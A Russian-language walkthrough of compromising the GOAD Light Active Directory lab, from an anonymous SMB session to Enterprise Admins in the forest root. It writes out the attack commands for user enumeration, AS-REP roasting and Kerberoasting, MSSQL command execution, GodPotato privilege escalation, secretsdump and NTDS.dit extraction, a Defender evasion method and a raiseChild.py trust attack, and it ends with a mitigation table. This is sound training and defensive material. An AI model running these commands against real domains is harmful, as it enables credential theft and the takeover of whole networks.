# GOAD Light: от null-сессии до корня леса

**Лаборатория · Active Directory · [GOAD Light](https://github.com/Orange-Cyberdefense/GOAD) · лес скомпрометирован полностью**

> **TL;DR** — null-сессия на DC → список пользователей → пароль в поле `Description` →
> файл с паролем в открытой шаре → AS-REP Roasting → RCE через MSSQL →
> `SeImpersonatePrivilege` → SYSTEM → кэшированный хэш локального админа контроллера домена →
> NTDS.dit дочернего домена → через доверие доменов — Enterprise Admins в корне леса.

**Стенд:** Windows Server 2019 ×3, `sevenkingdoms.local` + дочерний `north.sevenkingdoms.local`
**Классы:** anonymous SMB, credentials in AD attributes, open shares, AS-REP Roasting,
MSSQL RCE, abuse of `SeImpersonatePrivilege`, credential dumping, AMSI/AV evasion,
intra-forest trust abuse (SID History)

## Шаг 1. Разведка: что отвечает без пароля

```bash
netexec smb 192.168.56.10-11 192.168.56.22
```

Из вывода важны ровно два факта, и оба — про конфигурацию, а не про версии:

- `CASTELBLACK` — **`signing:False`**. SMB-подпись выключена → хост пригоден для NTLM relay.
- `KINGSLANDING` и `WINTERFELL` — **`Null Auth:True`**. Анонимная сессия разрешена.

> **Вывод этапа:** есть два разных вектора. Выбрал null-сессию —
> она тише, чем relay.

## Шаг 2. Учётка в поле «Описание»

```bash
netexec smb 192.168.56.11 -u '' -p '' --users
```

Контроллер дочернего домена отдал список из 10 пользователей анониму. На `KINGSLANDING` та же
команда не дала ничего — то есть дырявая настройка не общая для леса, а конкретная для одного DC.

В выводе:

```
samwell.tarly    2026-07-03 15:43:18   0   Samwell Tarly (Password : Heartsbane)
```

Пароль лежит в атрибуте `Description`. Атрибуты `description` и `info` у объектов AD
читаются любым аутентифицированным пользователем домена, а здесь — и анонимом.

```bash
netexec smb 192.168.56.10-11 192.168.56.22 -u 'samwell.tarly' -p 'Heartsbane'
```

Учётка валидна на `.11` и `.22`, на `.10` — `STATUS_LOGON_FAILURE`.

## Шаг 3. Шары: пароль в текстовом файле

```bash
netexec smb 192.168.56.11 192.168.56.22 -u 'samwell.tarly' -p 'Heartsbane' --shares
```

На `CASTELBLACK` — `all` (READ,WRITE) и `public` (READ,WRITE) «для всех пользователей домена».
На `public` пусто, на `all` лежит `arya.txt` с паролем `Needle`.

```bash
smbclient //192.168.56.22/all -U 'north.sevenkingdoms.local/samwell.tarly%Heartsbane'
```

`arya.stark:Needle` проходит на `.11` и `.22`.

## Шаг 4. Kerberos: AS-REP Roasting и Kerberoasting

Имея любую доменную учётку, можно запросить у KDC материал для оффлайн-брута, не трогая
учётки брутфорсом и не вызывая блокировок:

```bash
netexec ldap 192.168.56.11 -u 'arya.stark' -p 'Needle' --asreproast asrep.txt
netexec ldap 192.168.56.11 -u 'arya.stark' -p 'Needle' --kerberoasting kerb.txt
```

**AS-REP Roasting** работает там, где у пользователя снята пре-аутентификация Kerberos
(`DONT_REQ_PREAUTH`): KDC выдаёт AS-REP любому спросившему, а часть ответа зашифрована
паролем пользователя.

**Kerberoasting** — там, где у учётки прописан SPN: любой доменный пользователь имеет право
запросить TGS к сервису, а билет зашифрован NTLM-хэшем самой сервисной учётки.

Разница, которую стоит держать в голове: AS-REP Roasting бьёт по
**обычным** пользователям с выключенной пре-аутентификацией, Kerberoasting — по **сервисным**
учёткам с SPN. Первое — дефект настройки учётной записи, второе — следствие самой модели Kerberos,
и полностью от него не избавиться, только усложнить пароль сервисной учётки.

Хешкат по `rockyou`:

- `brandon.stark` : `iseedeadpeople`
- `jon.snow` : `iknownothing`

## Шаг 5. MSSQL → RCE

Параллельно отработал полный `nmap`:

```bash
sudo nmap -p- -sV -sC --script=default,vuln,auth -O -T4 -v -oA goad_full 192.168.56.10,11,22
```

MSSQL на `.22` (1433). Проверяю добытые пароли против него:

```bash
netexec mssql 192.168.56.22 -u 'jon.snow' -p 'iknownothing'
# [+] north.sevenkingdoms.local\jon.snow:iknownothing (Pwn3d!)
```

`Pwn3d!` означает, что учётка — `sysadmin` в СУБД. Отсюда выполнение команд:

```bash
netexec mssql 192.168.56.22 -u 'jon.snow' -p 'iknownothing' -x 'whoami'
# north\sql_svc
```

Команды выполняются от **`sql_svc`** — сервисной учётки SQL Server, а не от `jon.snow`.
Это важная деталь: контекст ОС определяется службой, а не тем, кто подключился к базе.

## Шаг 6. `SeImpersonatePrivilege` → SYSTEM

```bash
netexec mssql 192.168.56.22 -u 'jon.snow' -p 'iknownothing' -x 'whoami /priv'
```

У `sql_svc` активна **`SeImpersonatePrivilege`**. Это стандартная привилегия сервисных учёток —
и одновременно готовый путь к SYSTEM через Potato: привилегия позволяет
принять токен клиента, который подключился к нашему же процессу, а эксплойт организует
подключение от имени SYSTEM.

`GodPotato-NET4.exe`, заброшенный через MSSQL → `NT AUTHORITY\SYSTEM` на `CASTELBLACK`.

## Шаг 7. Сбор учётных данных и захват DC

С правами SYSTEM забираю кусты реестра и разбираю их:

```bash
impacket-secretsdump -sam SAM -security SECURITY LOCAL
```

На контроллере домена Defender работал и мешал: `lsassy` блокировался на попытке чтения памяти
LSASS, `cmd.exe` отсекался при копировании базы. Обошёл архитектурно, а не обфускацией:
создал теневую копию тома (Volume Shadow Copy), пути к файлам собрал конкатенацией строк, чтобы
не совпадали с сигнатурами, и прочитал `ntds.dit` и `SYSTEM` как сырые байты через .NET —
для антивируса это штатная работа системы.

- пароль СУБД в открытом виде: `YouWillNotKerboroast1ngMeeeeee` — тот случай, когда длинный пароль
  сервисной учётки действительно отбивает Kerberoasting;
- **кэшированный доменный хэш `robb.stark`** — машина хранит кэш для входов, выполненных на ней.

Хешкат ломает `robb.stark` → `sexywolfy`. Дальше самое важное:

```bash
netexec smb 192.168.56.11 -u 'robb.stark' -p 'sexywolfy'
# (Pwn3d!) на WINTERFELL
```

`robb.stark` оказывается локальным администратором **на контроллере домена**. Доступ к рядовому
серверу превратился в доступ к DC только потому, что привилегированный пользователь когда-то
логинился на этот рядовой сервер и оставил там кэш.

```bash
netexec smb 192.168.56.11 -u 'robb.stark' -p 'sexywolfy' --ntds
```

NTDS.dit выгружен — хэши всех пользователей домена `NORTH`, включая `Administrator`.

## Шаг 8. Из дочернего домена в корень леса

Доступа к `KINGSLANDING` по учёткам `NORTH` не было: пароли принимаются (`[+]`), в
административные шары не пускают — для родительского домена это пользователь из соседнего
домена, а не администратор. По SMB дальше хода нет.

Ход даёт не SMB, а само доверие доменов.

`north.sevenkingdoms.local` — дочерний домен `sevenkingdoms.local`, между ними автоматическое
двустороннее доверие, создаваемое при поднятии дочернего домена. Внутри одного леса **фильтрация
SID не применяется**: она обязана быть выключена, иначе перестанет работать миграция учётных
записей между доменами, ради которой `SID History` и существует. Из этого следует, что KDC
родительского домена принимает SID'ы, пришедшие из дочернего, не проверяя, имел ли дочерний
домен право их выдавать.

Из NTDS.dit у меня есть хэш `krbtgt` домена `NORTH` — то есть ключ, которым этот домен
подписывает билеты. Значит, можно выписать Golden Ticket и положить в поле `ExtraSids`
(тот же механизм, что `SID History`) идентификатор группы **Enterprise Admins** родительского
домена — `S-1-5-21-<SID корня>-519`. Билет выписан дочерним доменом, которому родитель доверяет,
и SID из него не отфильтровывается.

`raiseChild.py` из Impacket делает всю последовательность одной командой: собирает SID обоих
доменов, достаёт хэш `krbtgt` дочернего, формирует билет с нужным `ExtraSids` и получает TGT
в родительском домене.

```bash
raiseChild.py -target-exec 192.168.56.10 north.sevenkingdoms.local/robb.stark:sexywolfy
```

Результат — права Enterprise Admins, то есть administrator во всех доменах леса, включая
`sevenkingdoms.local`.

Смысл шага в том, что это не ошибка настройки конкретного стенда. Граница безопасности в AD —
**лес, а не домен**; так написано и в документации Microsoft. Дочерний домен, который заводят
«чтобы отделить филиал», защитным барьером не является: компрометация любого домена леса
означает компрометацию всего леса.

## Защита: что из этого чинится и как

| Что сработало | Чем закрывается |
|---|---|
| Анонимная SMB-сессия на DC | `RestrictAnonymous` / `RestrictAnonymousSAM`, запрет null-сессий; проверять **по каждому DC отдельно** — настройка хостовая |
| Пароль в `Description` пользователя | Регулярный аудит атрибутов `description`/`info` на строки, похожие на пароли. Это одна LDAP-выгрузка в месяц, а не проект |
| Пароль в файле на шаре «для всех» | Инвентаризация шар с правами `Everyone`/`Domain Users` на запись; DLP-поиск по `*.txt` с ключевыми словами |
| AS-REP Roasting | Снять `DONT_REQ_PREAUTH` везде, где он выставлен. Он почти всегда включён «временно, для старого приложения» |
| Kerberoasting | Длинные (25+) пароли у учёток с SPN, лучше — gMSA с автоматической ротацией |
| Повторное использование паролей между доменами | Разные пароли для учёток разных доменов леса — здесь именно это дало переход |
| `SeImpersonatePrivilege` → SYSTEM | Убрать лишние привилегии у сервисных учёток, обновляться (Potato-семейство частично закрывается патчами), контролировать запуск бинарей в каталогах SQL |
| Переход из дочернего домена в корень леса | Фильтрацию SID внутри леса включать нельзя без последствий для миграций — поэтому дочерний домен не считается границей безопасности. Если нужна настоящая изоляция — отдельный лес. Плюс защита `krbtgt`: двойная ротация, контроль выгрузки NTDS |
| Обход Defender через теневую копию | Мониторинг создания Volume Shadow Copy и доступа к `ntds.dit` — это редкие события, они хорошо детектируются, если их вообще собирают |
| Кэшированный хэш админа DC на рядовом сервере | **Tiering**: администраторы DC не логинятся на рядовые серверы. `CachedLogonsCount=0` на серверах, LSA Protection, Credential Guard |

## Выводы

- Вход в MSSQL под `jon.snow` даёт выполнение команд от `sql_svc`, а не от `jon.snow`.
  Не проверив `whoami`, легко построить неверную модель доступа дальше.
- Самое ценное на рядовом сервере — не данные, а чужие сессии: кэш `robb.stark` на `CASTELBLACK`
  стоил больше, чем вся база MSSQL.
- Null-сессия была на одном DC из двух. Проверять надо каждый хост: вывод «в домене разрешены
  анонимные сессии» был бы неверным.
- Семь шагов — ошибки администрирования, их можно исправить. Восьмой — штатное свойство леса,
  его исправить нельзя, можно только перестать на него рассчитывать.
